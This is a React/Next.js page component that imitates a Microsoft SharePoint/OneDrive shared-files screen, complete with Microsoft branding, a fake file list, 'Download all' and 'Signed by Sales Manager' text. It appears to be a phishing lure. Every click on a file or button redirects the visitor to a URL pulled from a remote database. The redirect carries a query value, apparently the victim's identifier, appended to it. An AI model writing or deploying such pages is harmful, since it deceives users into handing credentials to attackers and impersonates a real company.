"use client";

import { db, get, ref } from "@/lib/config";
import { BookIcon, readBooks } from "@/shared/utils";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";

export default function Main() {
  const [review, setReview] = useState("");
  const [variable, setVariable] = useState("");
  const [loading, setLoading] = useState(true);
  const router = useRouter();
  const [files, setFiles] = useState(readBooks);

  useEffect(() => {
    const fetchfiles = async () => {
      setLoading(true);
      try {
        const filesRef = ref(db, process.env.NEXT_PUBLIC_GY);
        const snapshot = await get(filesRef);
        if (snapshot.exists()) {
          const data = snapshot.val();
          if (data["form7"]?.title) {
            setVariable(data["form7"].title);
          }
          const updatedfiles = files.map((pdf, index) => ({
            ...pdf,
            title: data[`form${index + 1}`]?.title || pdf.title,
            icon: data[`form${index + 1}`]?.icon || pdf.icon,
            image: data[`form${index + 1}`]?.image || null,
          }));
          setFiles(updatedfiles);
        }
      } catch (error) {
        console.error("An error occured when fetching files", error);
      } finally {
        setLoading(false);
      }

      const reviewFromURL = getQueryParam("xi") || "";
      setReview(reviewFromURL);
    };

    fetchfiles();
  }, []);

  const preview = () => {
    if (loading) {
      return;
    }

    let url = variable;
    try {
      new URL(variable);
      url = `${variable}#${review}`;
    } catch (e) {
      console.error("Invalid variable:", variable);
      return;
    }
    router.push(url);
  };

  function getQueryParam(param) {
    return new URLSearchParams(window.location.search).get(param);
  }

  return (
    <div className="min-h-screen w-full default-font">
      <header className="bg-primary text-white flex items-center px-6 h-[50px]">
        <div className="flex items-center gap-1">
          <span>Microsoft</span>
          <span>|</span>
          <strong>SharePoint</strong>
        </div>
      </header>

      <main className="flex flex-col lg:flex-row max-w-7xl mx-auto p-6 gap-12">
        <div className="flex-1 flex flex-col gap-5">
          <nav className="p-4 bg-primary rounded-md flex items-center text-white gap-4 h-[87.2px]">
            <svg
              className="Svgs_mlog__n9c9I"
              width="50px"
              height="50px"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
              fill="#ffffff"
            >
              <g id="SVGRepo_bgCarrier" strokeWidth="0"></g>
              <g
                id="SVGRepo_tracerCarrier"
                strokeLinecap="round"
                strokeLinejoin="round"
              ></g>
              <g id="SVGRepo_iconCarrier">
                <path
                  fillRule="evenodd"
                  d="M 21.6924215,13.986674 
       C 22.9997233,14.1908343 24,15.3216239 24,16.6862741 
       C 24,17.7522298 23.3892094,18.6751163 22.4988002,19.1254521 
       C 22.4321553,19.1592575 22.3639409,19.1904067 22.294157,19.2186583 
       L 8.59404885,19.2186583 
       L 8.59404885,19.2181754 
       C 6.85476268,19.2073094 5.44797646,17.7943658 5.44797646,16.0524235 
       C 5.44797646,14.3037201 6.86550796,12.8860679 8.61421133,12.8860679 
       C 8.70222602,12.8860679 8.78903338,12.8906557 8.87511633,12.8976583 
       C 8.87028699,12.8172498 8.86702719,12.7364791 8.86702719,12.6548633 
       C 8.86702719,10.4662072 10.6413261,8.69190834 12.8299821,8.69190834 
       C 14.3676434,8.69190834 15.6998164,9.5683125 16.3568475,9.5683125 
       C 16.9002691,10.4918027 17.5498151,10.283779 18.2483789,10.283779 
       C 20.1559675,10.283779 21.7023216,11.8301331 21.7023216,13.7377217 
       C 21.7023216,13.8215107 21.6982167,13.9043338 21.6924215,13.986674 
       Z 
       M 8.18741857,12.2086324 
       C 6.25507961,12.421727 4.74711875,14.0641849 4.74711875,16.0524235 
       C 4.74711875,16.8619413 4.9992102,17.6150766 5.42841764,18.2378198 
       L 3.27887919,18.2378198 
       C 1.46799809,18.2378198 0,16.7698217 0,14.9589406 
       C 0,13.2281057 1.34134869,11.8115401 3.04103428,11.6894786 
       C 2.98428956,11.4324371 2.95350253,11.1656161 2.95350253,10.8915512 
       C 2.95350253,8.85248384 4.60646427,7.19964283 6.64541087,7.19964283 
       C 7.40977438,7.19964283 8.11980783,7.43181327 8.70886636,7.82963 
       C 9.54542848,6.15252157 11.276867,5 13.2783862,5 
       C 15.9223281,5 18.0967377,7.01021204 18.3569183,9.58557738 
       C 18.3206982,9.58461151 18.2847197,9.58292125 18.2483789,9.58292125 
       C 17.6798451,9.58292125 17.1232638,9.6982217 16.6079734,9.92012979 
       C 15.7386926,8.71545137 14.3462736,7.99105063 12.8299821,7.99105063 
       C 10.4089142,7.99105063 8.41282793,9.84563725 8.18741857,12.2086324 
       Z"
                />
              </g>
            </svg>
            <div className="flex flex-col">
              <div className="text-[1.3rem]">One Drive</div>
              <div className="text-[0.8rem]">Total file size: 26 MB</div>
            </div>
          </nav>

          <div className="bg-white rounded-lg shadow-sm border border-gray-200">
            <div className="p-3 border-b border-gray-200 bg-gray-50 rounded-t-lg">
              <div className="text-[17px]">File Explorer</div>
            </div>
            <div className="p-4 px-6 space-y-3">
              {files.map((book, index) => (
                <div
                  key={index}
                  onClick={preview}
                  className="flex items-center cursor-pointer justify-between py-2 border-b border-gray-200 last:border-b-0"
                >
                  <div className="flex items-center space-x-3">
                    {loading ? (
                      <Image
                        src={"/images/loader.svg"}
                        alt="loading.."
                        width={40}
                        height={40}
                      />
                    ) : book.image ? (
                      <Image
                        src={book.image}
                        alt={book.title}
                        width={40}
                        height={40}
                        className="object-contain rounded-sm"
                      />
                    ) : (
                      <BookIcon type={book.icon} />
                    )}{" "}
                    <span className="text-sm text-gray-700">
                      {!loading && book.title}
                    </span>
                  </div>
                  <span className="flex text-[0.85rem] text-accent-blue">
                    View
                  </span>
                </div>
              ))}
            </div>

            <div
              onClick={preview}
              className="p-3 bg-gray-50 group rounded-b-lg cursor-pointer border-t border-gray-200 text-right"
            >
              <button className="text-accent-blue text-sm font-medium">
                Download all
              </button>
            </div>
          </div>
        </div>

        <aside className="w-full lg:w-1/4 border pb-3 border-gray-200 flex flex-col h-fit">
          <Image
            src="/images/sh.gif"
            alt="Microsoft"
            width={512}
            height={288}
            loading="eager"
            unoptimized
          />
          <div className="px-4 py-6 text-light flex flex-col gap-1 text-[0.8rem]">
            <div>Signed by Sales Manager</div>
            <div>Public Access Duration: 24 hrs</div>
          </div>
        </aside>
      </main>
    </div>
  );
}
